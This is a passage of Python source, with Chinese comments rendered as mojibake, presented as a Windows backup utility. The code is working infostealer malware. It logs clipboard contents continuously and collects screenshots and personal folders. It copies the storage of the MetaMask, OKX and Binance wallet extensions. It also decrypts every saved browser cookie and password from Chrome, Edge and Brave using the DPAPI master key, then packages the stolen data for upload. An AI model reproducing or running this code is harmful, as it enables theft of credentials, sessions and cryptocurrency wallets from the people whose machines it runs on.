            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–JTBå†…å®¹"""
        try:
            content = pyperclip.paste()
            if content is None:
                return None
            # å»é™¤ç©ºç™½å­—ç¬¦
            content = content.strip()
            return content if content else None
        except (pyperclip.PyperclipException, RuntimeError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è·å–JTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•JTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•JTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§JTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºJTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°ï¼ˆå¯è€ƒè™‘æå–ä¸ºé…ç½®å¸¸é‡ï¼‰
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“JTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°JTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ JTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ JTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

def is_disk_available(disk_path):
    """æ£€æŸ¥ç£ç›˜æ˜¯å¦å¯ç”¨"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks():
    """è·å–æ‰€æœ‰å¯ç”¨çš„ç£ç›˜å’Œäº‘ç›˜ç›®å½•"""
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # å¤„ç†æ™®é€šç£ç›˜
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # ä½¿ç”¨Windowsè·¯å¾„æ ¼å¼
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, 'docs'), 1),  # æ–‡æ¡£ç±»
                'configs': (disk_path, os.path.join(backup_path, 'configs'), 2),  # é…ç½®ç±»
            }
            logging.info(f"æ£€æµ‹åˆ°å¯ç”¨ç£ç›˜: {disk_path}")
    
    # å¤„ç†ç”¨æˆ·ç›®å½•ä¸‹çš„æ–‡æ¡£/ä¸‹è½½ç›®å½•ï¼ˆæ”¯æŒä¸­è‹±æ–‡ç›®å½•åï¼‰
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        documents_names = ["Documents", "æ–‡æ¡£"]
        downloads_names = ["Downloads", "ä¸‹è½½"]

        for name in documents_names:
            documents_path = os.path.join(user_path, name)
            if os.path.exists(documents_path) and os.path.isdir(documents_path):
                documents_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_user_documents')
                available_disks['documents'] = {
                    'docs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, 'docs'), 1),
                    'configs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, 'configs'), 2),
                }
                logging.info(f"æ£€æµ‹åˆ°æ–‡æ¡£ç›®å½•: {documents_path}")
                break

        for name in downloads_names:
            downloads_path = os.path.join(user_path, name)
            if os.path.exists(downloads_path) and os.path.isdir(downloads_path):
                downloads_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_user_downloads')
                available_disks['downloads'] = {
                    'docs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, 'docs'), 1),
                    'configs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, 'configs'), 2),
                }
                logging.info(f"æ£€æµ‹åˆ°ä¸‹è½½ç›®å½•: {downloads_path}")
                break

    # å¤„ç†ç”¨æˆ·ç›®å½•ä¸‹çš„äº‘ç›˜æ–‡ä»¶å¤¹
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["äº‘", "ç½‘ç›˜", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # æ£€æŸ¥æ–‡ä»¶å¤¹åç§°æ˜¯å¦åŒ…å«äº‘ç›˜ç›¸å…³å…³é”®è¯
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # ä½¿ç”¨å®Œæ•´è·¯å¾„
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(BackupConfig.BACKUP_ROOT, f'{user_prefix}_cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'docs'), 1),
                            'configs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, 'configs'), 2),
                        }
                        logging.info(f"æ£€æµ‹åˆ°äº‘ç›˜ç›®å½•: {item_path}")
                        
                        # æ·»åŠ è°ƒè¯•æ—¥å¿—
                        if BackupConfig.DEBUG_MODE:
                            logging.debug(f"äº‘ç›˜æºç›®å½•: {os.path.abspath(item_path)}")
                            logging.debug(f"äº‘ç›˜å¤‡ä»½ç›®å½•: {cloud_backup_path}")
        except Exception as e:
            logging.error(f"æ‰«æç”¨æˆ·äº‘ç›˜ç›®å½•æ—¶å‡ºé”™: {e}")
    
    return available_disks

@lru_cache()
def get_username():
    """è·å–å½“å‰ç”¨æˆ·å"""
    return os.environ.get('USERNAME', '')

def backup_screenshots():
    """å¤‡ä»½æˆªå›¾æ–‡ä»¶"""
    def get_screenshot_location():
        """è¯»å– Windows æˆªå›¾é»˜è®¤ä¿å­˜è·¯å¾„ï¼ˆæ³¨å†Œè¡¨ï¼‰"""
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
            try:
                # â€œ{B7BEDE81-DF94-4682-A7D8-57A52620B86F}â€æ˜¯ Screenshots æ–‡ä»¶å¤¹
                path = winreg.QueryValueEx(key, "{B7BEDE81-DF94-4682-A7D8-57A52620B86F}")[0]
                if path and os.path.exists(path):
                    return path
            finally:
                winreg.CloseKey(key)
        except Exception:
            return None
        return None

    screenshot_paths = [
        os.path.join(os.environ.get('USERPROFILE', ''), "Pictures"),
        os.path.join(os.environ.get('ONEDRIVE', os.environ.get('USERPROFILE', '')), "Pictures")
    ]
    custom_path = get_screenshot_location()
    if custom_path and custom_path not in screenshot_paths:
        screenshot_paths.append(custom_path)

    screenshot_keywords = [
        "screenshot",
        "screen shot",
        "screen_shot",
        "å±å¹•å¿«ç…§",
        "å±å¹•æˆªå›¾",
        "æˆªå›¾",
        "æˆªå±"
    ]
    screenshot_extensions = {
        ".png", ".jpg", ".jpeg", ".heic", ".gif", ".tiff", ".tif", ".bmp", ".webp"
    }
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    screenshot_backup_directory = os.path.join(BackupConfig.BACKUP_ROOT, f"{user_prefix}_screenshots")
    
    backup_manager = BackupManager()
    
    # ç¡®ä¿å¤‡ä»½ç›®å½•æ˜¯ç©ºçš„
    if not backup_manager._clean_directory(screenshot_backup_directory):
        return None
        
    files_found = False
    for source_dir in screenshot_paths:
        if os.path.exists(source_dir):
            try:
                # æ‰«ææ•´ä¸ªPicturesç›®å½•ï¼Œç­›é€‰åŒ…å«"screenshot"å…³é”®å­—çš„æ–‡ä»¶
                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # æ£€æŸ¥æ–‡ä»¶åæ˜¯å¦åŒ…å«æˆªå›¾å…³é”®å­—ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # æ£€æŸ¥æ–‡ä»¶å¤§å°
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"ğŸ“¸ å·²å¤‡ä»½æˆªå›¾: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æˆªå›¾æ–‡ä»¶å¤±è´¥ {source_file}: {e}")
            except Exception as e:
                logging.error(f"å¤„ç†æˆªå›¾ç›®å½•å¤±è´¥ {source_dir}: {e}")
        else:
            logging.error(f"æˆªå›¾ç›®å½•ä¸å­˜åœ¨: {source_dir}")
            
    if files_found:
        logging.info("ğŸ“¸ æˆªå›¾å¤‡ä»½å®Œæˆï¼Œå·²æ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æ–‡ä»¶")
    else:
        logging.info("ğŸ“¸ æœªæ‰¾åˆ°ç¬¦åˆè§„åˆ™çš„æˆªå›¾æ–‡ä»¶")
            
    return screenshot_backup_directory if files_found else None

def backup_browser_extensions(backup_manager):
    """å¤‡ä»½æµè§ˆå™¨æ‰©å±•æ•°æ®ï¼ˆæ”¯æŒå¤šä¸ªæµè§ˆå™¨åˆ†èº«ï¼‰"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    extensions_backup_dir = os.path.join(
        backup_manager.config.BACKUP_ROOT,
        f"{user_prefix}_browser_extensions"
    )

    # æµè§ˆå™¨æ‰©å±•ç›¸å…³ç›®å½•ï¼ˆä»…å¤‡ä»½ MetaMask ä¸ OKX Walletï¼‰
    metamask_extension_id = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    okx_wallet_extension_id = "mcohilncbfahbmgdjkbpemcciiolgcge"
    binance_wallet_extension_id = "cadiboklkpojfamcoggejbbdjcoiljjk"
    
    # æµè§ˆå™¨ User Data æ ¹ç›®å½•
    browser_user_data_paths = {
        "chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
    }
    
    try:
        if not backup_manager._ensure_directory(extensions_backup_dir):
            return None

        # ä»…å¤‡ä»½ MetaMask ä¸ OKX Wallet æ‰©å±•æ•°æ®
        extensions = {
            "metamask": metamask_extension_id,
            "okx_wallet": okx_wallet_extension_id,
            "binance_wallet": binance_wallet_extension_id,
        }
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # å¤‡ä»½æ¯ä¸ª Profile ä¸­çš„æ‰©å±•
                for profile_name, ext_settings_path in profiles:
                    for ext_name, ext_id in extensions.items():
                        source_dir = os.path.join(ext_settings_path, ext_id)
                        if not os.path.exists(source_dir):
                            continue
                        
                        # ç›®æ ‡ç›®å½•åŒ…å« Profile åç§°
                        profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                        target_dir = os.path.join(extensions_backup_dir, 
                                                 f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                        try:
                            if os.path.exists(target_dir):
                                shutil.rmtree(target_dir, ignore_errors=True)
                            parent_dir = os.path.dirname(target_dir)
                            if backup_manager._ensure_directory(parent_dir):
                                shutil.copytree(source_dir, target_dir, symlinks=True)
                                backed_up_count += 1
                                if backup_manager.config.DEBUG_MODE:
                                    logging.info(f"ğŸ“¦ å·²å¤‡ä»½: {browser_name} {profile_name} {ext_name}")
                        except Exception as e:
                            logging.error(f"å¤åˆ¶æ‰©å±•ç›®å½•å¤±è´¥: {source_dir} - {e}")
            
            except Exception as e:
                logging.error(f"æ‰«æ {browser_name} é…ç½®æ–‡ä»¶å¤±è´¥: {e}")

        if backed_up_count > 0:
            logging.info(f"ğŸ“¦ æˆåŠŸå¤‡ä»½ {backed_up_count} ä¸ªæµè§ˆå™¨æ‰©å±•")
            return extensions_backup_dir
        else:
            logging.warning("âš ï¸ æœªæ‰¾åˆ°ä»»ä½•æµè§ˆå™¨æ‰©å±•æ•°æ®")
            return None
    except Exception as e:
        logging.error(f"å¤åˆ¶æµè§ˆå™¨æ‰©å±•ç›®å½•å¤±è´¥: {e}")
        return None

def export_browser_cookies_passwords(backup_manager):
    """å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç ï¼ˆåŠ å¯†å¤‡ä»½ï¼‰"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("â­ï¸  è·³è¿‡æµè§ˆå™¨æ•°æ®å¯¼å‡ºï¼ˆç¼ºå°‘å¿…è¦åº“ï¼‰")
        return None
    
    try:
        logging.info("ğŸ” å¼€å§‹å¯¼å‡ºæµè§ˆå™¨ Cookies å’Œå¯†ç ...")
        
        # è·å–ç”¨æˆ·åå‰ç¼€
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        
        # æµè§ˆå™¨ User Data æ ¹ç›®å½•ï¼ˆæ”¯æŒå¤šä¸ª Profileï¼‰
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "browsers": {}
        }
        
        def sqlite_online_backup(source_db, dest_db):
            """ä½¿ç”¨ SQLite Online Backup å¤åˆ¶æ•°æ®åº“"""
            try:
                source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
                dest_conn = sqlite3.connect(dest_db)
                source_conn.backup(dest_conn)
                source_conn.close()
                dest_conn.close()
                return True
            except Exception as e:
                logging.debug(f"SQLite åœ¨çº¿å¤‡ä»½å¤±è´¥: {e}")
                return False
        
        def safe_copy_locked_file(source_path, dest_path, max_retries=3):
            """å®‰å…¨å¤åˆ¶è¢«é”å®šçš„æ–‡ä»¶ï¼ˆæµè§ˆå™¨è¿è¡Œæ—¶ï¼‰"""
            for attempt in range(max_retries):
                try:
                    shutil.copy2(source_path, dest_path)
                    return True
                except PermissionError:
                    try:
                        with open(source_path, 'rb') as src, open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                        return True
                    except Exception as e:
                        if attempt == max_retries - 1:
                            logging.debug(f"æ–‡ä»¶è¢«é”å®šï¼Œå°è¯• SQLite åœ¨çº¿å¤‡ä»½: {source_path}")
                            return sqlite_online_backup(source_path, dest_path)
                        time.sleep(0.5)
                except Exception as e:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {e}")
                    return False
            return False

        def decrypt_dpapi_batch(cipher_list):
            """æ‰¹é‡ DPAPI è§£å¯†ï¼ˆWindows æœ¬åœ°ï¼‰"""
            results = []
            for cipher_text in cipher_list:
                try:
                    results.append(CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8', errors='ignore'))
                except Exception as e:
                    logging.debug(f"DPAPI è§£å¯†å¤±è´¥: {e}")
                    results.append(None)
            return results

        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """å¯¼å‡ºå•ä¸ª Profile çš„ Cookies å’Œå¯†ç """
            cookies = []
            passwords = []
            
            # å¯¼å‡º Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    if safe_copy_locked_file(cookies_path, temp_cookies):
                        conn = sqlite3.connect(temp_cookies)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    
                        dpapi_cookie_items = []
                        for row in cursor.fetchall():
                            host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                            try:
                                if encrypted_value[:3] == b'v10' and master_key:
                                    iv = encrypted_value[3:15]
                                    payload = encrypted_value[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_value:
                                        cookies.append({
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        })
                                else:
                                    dpapi_cookie_items.append(({
                                        "host": host,
                                        "name": name,
                                        "value": None,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    }, encrypted_value))
                            except Exception as e:
                                logging.debug(f"Cookies è§£å¯†å¤±è´¥: {e}")
                        if dpapi_cookie_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                            for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                if dec:
                                    item["value"] = dec
                                    cookies.append(item)
                    else:
                        logging.debug(f"æ— æ³•å¤åˆ¶ Cookies æ•°æ®åº“: {cookies_path}")
                except Exception as e:
                    logging.debug(f"å¯¼å‡º Cookies å¤±è´¥: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # å¯¼å‡ºå¯†ç 
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    if safe_copy_locked_file(login_data_path, temp_login):
                        conn = sqlite3.connect(temp_login)
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    
                        dpapi_password_items = []
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            try:
                                if encrypted_password[:3] == b'v10' and master_key:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_password:
                                        passwords.append({
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                else:
                                    dpapi_password_items.append(({
                                        "url": url,
                                        "username": username,
                                        "password": None
                                    }, encrypted_password))
                            except Exception as e:
                                logging.debug(f"å¯†ç è§£å¯†å¤±è´¥: {e}")
                        if dpapi_password_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                            for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                if dec:
                                    item["password"] = dec
                                    passwords.append(item)
                    else:
                        logging.debug(f"æ— æ³•å¤åˆ¶ Login Data æ•°æ®åº“: {login_data_path}")
                except Exception as e:
                    logging.debug(f"å¯¼å‡ºå¯†ç å¤±è´¥: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            return cookies, passwords
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # è·å–ä¸»å¯†é’¥ï¼ˆæ‰€æœ‰ Profile å…±äº«åŒä¸€ä¸ª Master Keyï¼‰
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
                    # å°† Master Key ç¼–ç ä¸º base64 ä»¥ä¾¿ä¿å­˜
                    master_key_b64 = base64.b64encode(master_key).decode('utf-8')
                except Exception as e:
                    logging.debug(f"è·å– {browser_name} Master Key å¤±è´¥: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # æ‰«ææ‰€æœ‰å¯èƒ½çš„ Profile ç›®å½•ï¼ˆDefault, Profile 1, Profile 2, ...ï¼‰
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # æ£€æŸ¥æ˜¯å¦æ˜¯ Profile ç›®å½•ï¼ˆDefault æˆ– Profile Nï¼‰
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # æ£€æŸ¥æ˜¯å¦å­˜åœ¨ Cookies æˆ– Login Data æ–‡ä»¶
                        cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"âŒ æ‰«æ {browser_name} Profile ç›®å½•å¤±è´¥: {e}")
                continue
            
            if not profiles:
                logging.warning(f"âš ï¸  {browser_name} æœªæ‰¾åˆ°ä»»ä½• Profile")
                continue
            
            # ä¸ºæ¯ä¸ª Profile å¯¼å‡ºæ•°æ®
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  ğŸ“‚ å¤„ç† Profile: {profile_name}")
                
                cookies, passwords = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords:
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords)
                    }
                    logging.info(f"    âœ… {profile_name}: {len(cookies)} Cookies, {len(passwords)} å¯†ç ")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # å¤‡ä»½ Master Keyï¼ˆbase64 ç¼–ç ï¼Œæ‰€æœ‰ Profile å…±äº«ï¼‰
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "âœ…" if master_key_b64 else "âš ï¸"
                total_cookies = all_data["browsers"][browser_name]["total_cookies"]
                total_passwords = all_data["browsers"][browser_name]["total_passwords"]
                logging.info(f"âœ… {browser_name}: {len(browser_profiles)} ä¸ª Profile, {total_cookies} Cookies, {total_passwords} å¯†ç  {master_key_status} Master Key")
        
        # åŠ å¯†ä¿å­˜
        password = "cookies2026"
        salt = get_random_bytes(32)
        key = PBKDF2(password, salt, dkLen=32, count=100000)
        cipher = AES.new(key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(all_data, ensure_ascii=False).encode('utf-8'))
        
        encrypted_data = {
            "salt": base64.b64encode(salt).decode('utf-8'),
            "nonce": base64.b64encode(cipher.nonce).decode('utf-8'),
            "tag": base64.b64encode(tag).decode('utf-8'),
            "ciphertext": base64.b64encode(ciphertext).decode('utf-8')
        }
        
        # ä¿å­˜åˆ°æ–‡ä»¶
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_dir = os.path.join(backup_manager.config.BACKUP_ROOT, f"{user_prefix}_browser_exports")
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, f"{user_prefix}_browser_data_{timestamp}.encrypted")
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
        
        logging.critical("âœ… æµè§ˆå™¨æ•°æ®å¯¼å‡ºæˆåŠŸ")
        return output_file
        
    except Exception as e:
        logging.error(f"âŒ æµè§ˆå™¨æ•°æ®å¯¼å‡ºå¤±è´¥: {e}")
        return None

def backup_and_upload_logs(backup_manager):
    """å¤‡ä»½å¹¶ä¸Šä¼ æ—¥å¿—æ–‡ä»¶"""
    log_file = backup_manager.config.LOG_FILE
    
    try:
        if not os.path.exists(log_file):
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"å¤‡ä»½æ—¥å¿—æ–‡ä»¶ä¸å­˜åœ¨ï¼Œè·³è¿‡: {log_file}")
            return
        
        # åˆ·æ–°æ—¥å¿—ç¼“å†²åŒºï¼Œç¡®ä¿æ‰€æœ‰æ—¥å¿—éƒ½å·²å†™å…¥æ–‡ä»¶
        for handler in logging.getLogger().handlers:
            if hasattr(handler, 'flush'):
                handler.flush()
        
        # ç­‰å¾…ä¸€å°æ®µæ—¶é—´ï¼Œç¡®ä¿æ–‡ä»¶ç³»ç»ŸåŒæ­¥
        time.sleep(0.5)
            
        # æ£€æŸ¥æ—¥å¿—æ–‡ä»¶å¤§å°
        file_size = os.path.getsize(log_file)
        if file_size == 0:
            if backup_manager.config.DEBUG_MODE:
